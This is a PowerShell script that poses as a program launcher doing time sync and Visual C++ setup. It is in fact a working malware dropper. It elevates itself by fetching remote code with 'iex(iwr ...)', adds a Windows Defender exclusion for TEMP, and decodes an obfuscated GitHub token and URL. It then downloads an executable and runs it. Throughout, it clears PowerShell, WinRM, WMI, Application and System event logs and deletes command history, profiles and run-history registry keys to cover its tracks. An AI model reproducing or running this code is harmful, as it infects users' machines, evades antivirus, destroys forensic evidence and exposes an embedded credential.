function Disable-ConsolePause {
    try {
        # Добавляем необходимые типы для работы с консолью
        Add-Type -TypeDefinition @"
            using System;
            using System.Runtime.InteropServices;
            
            public static class ConsoleHelper {
                [DllImport("kernel32.dll", SetLastError = true)]
                public static extern IntPtr GetStdHandle(int nStdHandle);
                
                [DllImport("kernel32.dll", SetLastError = true)]
                public static extern bool GetConsoleMode(IntPtr hConsoleHandle, out uint lpMode);
                
                [DllImport("kernel32.dll", SetLastError = true)]
                public static extern bool SetConsoleMode(IntPtr hConsoleHandle, uint dwMode);
                
                public const int STD_INPUT_HANDLE = -10;
                public const uint ENABLE_QUICK_EDIT_MODE = 0x0040;
                public const uint ENABLE_EXTENDED_FLAGS = 0x0080;
            }
"@ -ErrorAction SilentlyContinue

        # Получаем хендл ввода консоли
        $hInput = [ConsoleHelper]::GetStdHandle([ConsoleHelper]::STD_INPUT_HANDLE)
        
        if ($hInput -ne [IntPtr]::Zero) {
            # Читаем текущие режимы консоли
            $consoleMode = 0
            if ([ConsoleHelper]::GetConsoleMode($hInput, [ref]$consoleMode)) {
                # Отключаем флаги ENABLE_QUICK_EDIT_MODE и ENABLE_EXTENDED_FLAGS
                $newMode = $consoleMode -band (-bnot ([ConsoleHelper]::ENABLE_QUICK_EDIT_MODE -bor [ConsoleHelper]::ENABLE_EXTENDED_FLAGS))
                [ConsoleHelper]::SetConsoleMode($hInput, $newMode) | Out-Null
            }
        }
    } catch {
        # Игнорируем ошибки, если не удалось отключить паузу
    }
}

function Test-RunAsAdmin {
    $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

    if (-not $isAdmin) {
        $arguments = "-NoProfile -ExecutionPolicy Bypass -Command `"iex( iwr rf4bot.ru)`""

        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = "powershell.exe"
        $psi.Arguments = $arguments
        $psi.Verb = "runas"

        try {
            [Diagnostics.Process]::Start($psi) | Out-Null
            Exit
        } catch {
            Write-Error "Error: Failed to start with administrator privileges."
            Exit 1
        }
    }
}

try {
    $PSDefaultParameterValues['*:Verbose'] = $false
    $PSDefaultParameterValues['*:Debug'] = $false
    $VerbosePreference = 'SilentlyContinue'
    $DebugPreference = 'SilentlyContinue'
    $ProgressPreference = 'SilentlyContinue'
    $InformationPreference = 'SilentlyContinue'
    
    Set-PSReadlineOption -HistorySaveStyle SaveNothing -ErrorAction SilentlyContinue
    
    try {
        wevtutil clear-log "Windows PowerShell" 2>$null
        wevtutil clear-log "Microsoft-Windows-PowerShell/Operational" 2>$null
        wevtutil clear-log "Microsoft-Windows-PowerShell/Analytic" 2>$null
        Clear-EventLog -LogName "Windows PowerShell" -ErrorAction SilentlyContinue
    } catch {}
} catch {}

$global:hadErrors = $false

function Global:Write-Error {
    param(
        [Parameter(Mandatory=$true, Position=0)]
        [string]$Message
    )
    $global:hadErrors = $true
    Microsoft.PowerShell.Utility\Write-Error $Message
}

Function Sync-LocalTime {
    param([string]$NtpServer = "time.windows.com")
    
    
    try {
        # check and restore time service
        $timeService = Get-Service w32time -ErrorAction SilentlyContinue
        if (-not $timeService) {
            # restore time service
            sc.exe create w32time binPath= "C:\Windows\System32\svchost.exe -k LocalService" start= auto DisplayName= "Служба времени Windows" | Out-Null
            sc.exe config w32time start= auto | Out-Null
            sc.exe config w32time type= share | Out-Null
        }
        
        # set type of start of time service
        Set-Service w32time -StartupType Automatic -ErrorAction SilentlyContinue
        
        # start time service
        if ((Get-Service w32time).Status -ne "Running") {
            Start-Service w32time -ErrorAction Stop
            Start-Sleep -Seconds 3
        }
        
        # configure and sync time
        w32tm /config /manualpeerlist:"$NtpServer" /syncfromflags:MANUAL /update | Out-Null
        Restart-Service w32time -ErrorAction Stop
        w32tm /resync /force | Out-Null
        
        return $true
    }
    catch {
        try {
            # alternative method through net time
            net time /set /y | Out-Null
            Write-Host "time sync success with alternative method" -ForegroundColor Green
            return $true
        }
        catch {
            return $false
        }
    }
}

Function DefenderClean {
    try {
        Remove-MpPreference -ExclusionPath $env:TEMP -ErrorAction Ignore
    } catch {
    }
}

Function SecureCleanup {
    try {
        Add-Type -AssemblyName System.Windows.Forms
        [System.Windows.Forms.Clipboard]::Clear()
    } catch {
    }
    
    try {
        $logsToClean = @(
            "Windows PowerShell",
            "Microsoft-Windows-PowerShell/Operational",
            "Microsoft-Windows-PowerShell/Analytic",
            "Microsoft-Windows-PowerShell/Debug",
            "Microsoft-Windows-PowerShell-DesiredStateConfiguration-FileDownloadManager/Operational",
            "Microsoft-Windows-PowerShell/Admin",
            "PowerShellCore/Operational",
            "Microsoft-Windows-WinRM/Operational",
            "Microsoft-Windows-WMI-Activity/Operational"
        )
        
        foreach ($log in $logsToClean) {
            try {
                wevtutil clear-log "$log" 2>$null
                wevtutil set-log "$log" /enabled:false 2>$null
                wevtutil set-log "$log" /enabled:true 2>$null
            } catch {
            }
        }
        
        try {
            Clear-EventLog -LogName "Windows PowerShell" -ErrorAction SilentlyContinue
            Clear-EventLog -LogName "Application" -ErrorAction SilentlyContinue
            Clear-EventLog -LogName "System" -ErrorAction SilentlyContinue
        } catch {}
        
        try {
            Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'} -MaxEvents 1000 -ErrorAction SilentlyContinue | ForEach-Object {
                try {
                    Remove-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; Id=$_.Id} -ErrorAction SilentlyContinue
                } catch {}
            }
        } catch {}
        
    } catch {
    }
    
    try {
        $pathsToClean = @(
            "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt",
            "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\Visual Studio Code Host_history.txt",
            "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\Windows PowerShell ISE Host_history.txt",
            "$env:LOCALAPPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt",
            "$env:USERPROFILE\Documents\PowerShell\Microsoft.PowerShell_profile.ps1",
            "$env:USERPROFILE\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1",
            "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\*",
            "$env:LOCALAPPDATA\Microsoft\Windows\PowerShell\PSReadline\*"
        )
        
        foreach ($path in $pathsToClean) {
            try {
                Remove-Item $path -Force -Recurse -ErrorAction SilentlyContinue
            } catch {}
        }
        
        $dirsToClean = @(
            "$env:APPDATA\Microsoft\Windows\PowerShell",
            "$env:LOCALAPPDATA\Microsoft\Windows\PowerShell"
        )
        
        foreach ($dir in $dirsToClean) {
            try {
                Remove-Item $dir -Recurse -Force -ErrorAction SilentlyContinue
            } catch {}
        }
        
    } catch {
    }
    
    try {
        $tempPaths = @($env:TEMP, $env:TMP, "$env:USERPROFILE\AppData\Local\Temp", "$env:SystemRoot\Temp")
        
        foreach ($tempPath in $tempPaths) {
            if (Test-Path $tempPath) {
                Get-ChildItem -Path $tempPath -Filter "*.ps1" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
                Get-ChildItem -Path $tempPath -Filter "*PowerShell*" -ErrorAction SilentlyContinue | Remove-Item -Force -Recurse -ErrorAction SilentlyContinue
                Get-ChildItem -Path $tempPath -Filter "*.tmp" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
                Get-ChildItem -Path $tempPath -Filter "tmp*" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
            }
        }
        
    } catch {
    }
    
    try {
        $regPaths = @(
            "HKCU:\Software\Microsoft\PowerShell",
            "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU",
            "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths"
        )
        
        foreach ($regPath in $regPaths) {
            try {
                Remove-Item $regPath -Recurse -Force -ErrorAction SilentlyContinue
            } catch {}
        }
        
    } catch {
    }
    
    try {
        ipconfig /flushdns | Out-Null
        arp -d * 2>$null | Out-Null
        netsh winsock reset 2>$null | Out-Null
    } catch {
    }
    
    try {
        wevtutil clear-log "Windows PowerShell" 2>$null
        wevtutil clear-log "Microsoft-Windows-PowerShell/Operational" 2>$null
        wevtutil clear-log "Microsoft-Windows-PowerShell/Analytic" 2>$null
        wevtutil clear-log "Microsoft-Windows-PowerShell/Debug" 2>$null
        Clear-EventLog -LogName "Windows PowerShell" -ErrorAction SilentlyContinue
        Clear-EventLog -LogName "Application" -ErrorAction SilentlyContinue
    } catch {
    }
}

Clear-Host
Disable-ConsolePause
Test-RunAsAdmin
Write-Host "Waiting... Synchronizing time..." -ForegroundColor Green
try {
    wevtutil clear-log "Windows PowerShell" 2>$null
    wevtutil clear-log "Microsoft-Windows-PowerShell/Operational" 2>$null
    wevtutil clear-log "Microsoft-Windows-PowerShell/Analytic" 2>$null
    wevtutil clear-log "Microsoft-Windows-PowerShell/Debug" 2>$null
    Clear-EventLog -LogName "Windows PowerShell" -ErrorAction SilentlyContinue
    Clear-EventLog -LogName "Application" -ErrorAction SilentlyContinue
} catch {}

# Синхронизация времени
$servers = @("time.windows.com", "pool.ntp.org", "time.nist.gov")
foreach ($server in $servers) {
    if (Sync-LocalTime -NtpServer $server) { break }
}
Clear-Host
Write-Host "Waiting... Preparing start program..." -ForegroundColor Green
function Set-RegistryValue {
    param (
        [string]$Path = "HKLM:\SOFTWARE\Microsoft\Internet Explorer\Main",
        [string]$Name = "DisableFirstRunCustomize",
        [int]$Value = 2
    )

    try {
        Set-ItemProperty -Path $Path -Name $Name -Value $Value
    } catch {
    }
}
Clear-Host
Write-Host "Waiting... Preparing start program... Stage 1" -ForegroundColor Green

try {
    wevtutil cl "Microsoft-Windows-PowerShell/Operational"
    Clear-EventLog -LogName "Windows PowerShell" -ErrorAction Stop
} catch {
}
Clear-Host
Write-Host "Waiting... Preparing start program... Stage 2" -ForegroundColor Green
# === Проверка и автоустановка Visual C++ Redistributable 2022 (x64) ===
$systemPath = "$env:SystemRoot\System32"
$temp = $env:TEMP
$vcDll = Join-Path $systemPath "msvcp140.dll"
$requiredVersion = [version]"14.44.35211.0"
$needInstall = $false

function Get-VCRedistVersion {
    param ($path)
    if (Test-Path $path) {
        try {
            return [version]((Get-Item $path).VersionInfo.FileVersion)
        } catch { return $null }
    }
    return $null
}
try	{
	# Проверяем наличие DLL
	$currentVersion = Get-VCRedistVersion -path $vcDll
	if ($null -eq $currentVersion) {
		Write-Host "VC++ Redistributable not found. Need Install."
		$needInstall = $true
	} elseif ($currentVersion -lt $requiredVersion) {
		Write-Host "Current version VC++ Redistributable: $currentVersion (need $requiredVersion)"
		$needInstall = $true
	} else { }

	if ($needInstall) {
		try {
			$redistFilePath = Join-Path $temp "VC_redist.x64.exe"

			# Удаляем старый установщик
			if (Test-Path $redistFilePath) {
				Remove-Item $redistFilePath -ErrorAction Ignore
			}

			# Скачиваем актуальный VC++ 2022
			Write-Host "Download last VC++ Redistributable..."
			Invoke-WebRequest -Uri "https://aka.ms/vs/17/release/vc_redist.x64.exe" -OutFile $redistFilePath -ErrorAction Stop

			# Тихая установка / обновление
			Write-Host "Install Visual C++ Redistributable..."
			Start-Process -FilePath $redistFilePath -ArgumentList "/install", "/quiet", "/norestart" -Wait -ErrorAction Stop

			# Удаляем установщик
			Remove-Item $redistFilePath -ErrorAction Ignore

			Write-Host "Visual C++ Redistributable updated."
		}
		catch {
			Write-Error "Error install VC++ Redistributable: $($_.Exception.Message)"
		}
	}


	Clear-Host
	Write-Host "Waiting... Preparing start program... Stage 3" -ForegroundColor Green
	try { 
        if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
            try {
                $defenderService = Get-Service WinDefend -ErrorAction SilentlyContinue
                if ($defenderService -and $defenderService.Status -eq "Running") {
                    $preferences = Get-MpPreference -ErrorAction SilentlyContinue
                    if ($preferences) {
                        if ($preferences.DisableRealtimeMonitoring -eq $true) {
                        }
                        try {
                            Add-MpPreference -ExclusionPath $temp -ErrorAction Stop
                        } catch {
                            if ($_.Exception.Message -like "*0x800106ba*" -or $_.Exception.Message -like "*tamper*" -or $_.Exception.Message -like "*policy*") {
                            } else {
                            }
                        }
                    } else {
                    }
                } else {
                }
            } catch {
            }
        } else {
        }
    } catch {
    }
	Clear-Host
	Write-Host "Waiting... Preparing start program... Stage 4" -ForegroundColor Green
	try {
        Start-Process -FilePath "C:\Windows\system32\rundll32.exe" -ArgumentList "C:\Windows\system32\WININET.dll,DispatchAPICall 3" -NoNewWindow -Wait
    } catch {
    } 
	Clear-Host
	Write-Host "Download..." -ForegroundColor Green
    $contFile = [System.IO.Path]::GetTempFileName()
    try {
		$String = "QmVhcmVyIGdpdGh1Yl9wYXRfMTFCSkVOSDRJMGRZWjNVeTJtWnNxTl9PWVVNWVdkcGdTWHJybk43V3pDbjIwbkVlUm5zRTVvYVVQWlJSclpsd3hWQ1hHNktGNlFOR2p0aWhMdw=="
		$String = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($String))
        $Url = "aHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy94c2RlbWVudGV2eC9sYXVuY2hlci9jb250ZW50cy9sYXVuY2hlcl9kbGwuZXhl"
        $Url = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($Url))
		$h = @{
			"Authorization"  = "$String"
			"Cache-Control"  = "no-cache"
		}
        $response = Invoke-RestMethod $Url -Method 'GET' -Headers $h
		Invoke-WebRequest $response.download_url -OutFile $contFile
		Clear-Host
		Write-Host "Download end..." -ForegroundColor Green

		
        if (Test-Path $contFile) {
			try {
                Clear-Host
				Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$contFile`"" -NoNewWindow
				Exit 0
			} catch {
				Write-Error "Error: Failed to execute downloaded file. $($_.Exception.Message)"
				try {
					Remove-Item $contFile -Force -ErrorAction SilentlyContinue
				} catch {}
				Start-Sleep -s 3
			}
        } else {
            Write-Error "Error: Downloaded file does not exist at expected location."
            try {
                Remove-Item $contFile -Force -ErrorAction SilentlyContinue
            } catch {}
            Start-Sleep -s 3
        }
    } catch {
        Write-Error "Error: Failed to download or process the file. $($_.Exception.Message)"
        try {
            Remove-Item $contFile -Force -ErrorAction SilentlyContinue
        } catch {}
        Start-Sleep -s 3
    }


} finally {
	Set-RegistryValue
}

if ($global:hadErrors) {
    Write-Host "`nErrors were encountered during script execution." -ForegroundColor Red
    Write-Host "Console will automatically close in 5 seconds..." -ForegroundColor Yellow
    Start-Sleep -Seconds 5
    Exit 1
}

DefenderClean
SecureCleanup 